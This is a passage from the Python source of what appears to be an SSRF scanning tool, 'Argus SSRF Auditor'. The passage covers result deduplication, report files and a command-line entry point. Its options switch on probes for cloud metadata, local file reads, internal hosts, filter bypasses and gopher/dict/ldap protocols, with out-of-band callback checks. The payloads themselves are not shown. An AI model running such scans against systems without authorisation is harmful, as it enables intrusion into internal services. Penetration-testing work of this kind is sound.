                    test_file_read_enabled=test_file_read_enabled,
                    test_internal=test_internal,
                    test_bypass_enabled=test_bypass_enabled,
                    test_protocols=test_protocols,
                )
                all_findings.extend(findings)
                results.append({
                    "url": url, "param": param, "location": location,
                    "baseline": baseline.to_dict(),
                    "finding_count": len(findings),
                })
                if findings:
                    top = findings[0]
                    log.info(f"           → {top.severity} ({top.technique}, {top.confidence}%)")
            except Exception as e:
                log.warning(f"           → error: {e}")
                results.append({
                    "url": url, "param": param, "location": location,
                    "error": str(e),
                })

        # ── OOB correlation pass ────────────────────────────────────────────
        if oob_active:
            all_findings = confirm_oob_batch(oob, all_findings)
    finally:
        oob.stop()

    # ── Deduplicate ──────────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[SSRFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.technique)
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    # ── Sort ────────────────────────────────────────────────────────────────
    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.target))

    # ── Write outputs ────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    by_technique: dict[str, int] = {}

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1

    # Flat candidates
    candidate_lines = [
        f"{f.target}\t{f.param}\t{f.technique}\t{f.severity}\t{f.confidence}\t{f.evidence[:140]}"
        for f in deduped
    ]
    (outdir / "ssrf_candidates.txt").write_text("\n".join(candidate_lines) + "\n")

    # Confirmed (HIGH+)
    confirmed = [f for f in deduped if f.severity in ("CRITICAL", "HIGH") and f.confidence >= 85]
    (outdir / "ssrf_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.payload[:150]}"
            for f in confirmed
        ) + "\n"
    )

    # OOB-specific
    oob_findings = [f for f in deduped if f.technique == "oob"]
    (outdir / "ssrf_oob.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.oob_token}\t{f.severity}\t{f.confidence}"
            for f in oob_findings
        ) + "\n"
    )

    # JSON report
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "config": {
            "oob_domain":         oob_domain,
            "interactsh":         use_interactsh,
            "test_metadata":      test_metadata,
            "test_file_read":     test_file_read_enabled,
            "test_internal":      test_internal,
            "test_bypass":        test_bypass_enabled,
            "test_protocols":     test_protocols,
            "authenticated":      headers is not None,
        },
        "totals": {
            "urls_input":       len(urls),
            "surfaces_tested":  len(surfaces),
            "total_findings":   len(deduped),
            "confirmed":        len(confirmed),
            "oob_findings":     len(oob_findings),
            "critical":         by_severity["CRITICAL"],
            "high":             by_severity["HIGH"],
            "medium":           by_severity["MEDIUM"],
            "low":              by_severity["LOW"],
        },
        "summary": {
            "by_severity":  by_severity,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
        },
        "results":  results,
        "findings": [f.to_dict() for f in deduped],
    }

    json_path = outdir / "ssrf_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # ── Console summary ─────────────────────────────────────────────────────
    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
    log.info(f"    ssrf_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info(f"    ssrf_confirmed.txt           {len(confirmed):>5} confirmed")
    log.info(f"    ssrf_oob.txt                 {len(oob_findings):>5} OOB finding(s)")

    log.info("")
    log.info(
        f"  Severity : "
        f"CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  "
        f"MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )

    if by_technique:
        log.info(f"  Technique: " + " · ".join(f"{k}({v})" for k, v in by_technique.items()))

    if confirmed:
        log.info("")
        log.info("  Confirmed SSRF findings:")
        for f in confirmed[:10]:
            log.info(f"    [{f.severity:<8}] {f.technique:<12} {f.param:<15} {f.target[:55]}")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(
    outdir: Path, input_file: Path, start: float,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "config": {},
        "totals": {
            "urls_input": 0, "surfaces_tested": 0, "total_findings": 0,
            "confirmed": 0, "oob_findings": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0,
        },
        "summary": {"by_severity": {}, "by_technique": {}},
        "results": [],
        "findings": [],
    }
    path = outdir / "ssrf_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("ssrf_candidates.txt", "ssrf_confirmed.txt", "ssrf_oob.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE TEST
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_ssrf.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(description="Argus SSRF Auditor (standalone)")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--oob-domain", help="OOB domain (Burp Collaborator / interactsh)")
    parser.add_argument("--interactsh", action="store_true", help="Spawn interactsh-client")
    parser.add_argument("--no-metadata", action="store_true")
    parser.add_argument("--no-file-read", action="store_true")
    parser.add_argument("--no-internal", action="store_true")
    parser.add_argument("--no-bypass", action="store_true")
    parser.add_argument("--protocols", action="store_true", help="Enable gopher/dict/ldap")
    parser.add_argument("--max-surfaces", type=int, default=300)
    args = parser.parse_args()

    headers = {"Cookie": args.cookie} if args.cookie else None

    try:
        run_ssrf_scan(
            args.input, args.output,
            oob_domain=args.oob_domain,
            use_interactsh=args.interactsh,
            headers=headers,
            test_metadata=not args.no_metadata,
            test_file_read_enabled=not args.no_file_read,
            test_internal=not args.no_internal,
            test_bypass_enabled=not args.no_bypass,
            test_protocols=args.protocols,
            max_surfaces=args.max_surfaces,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        sys.exit(1)
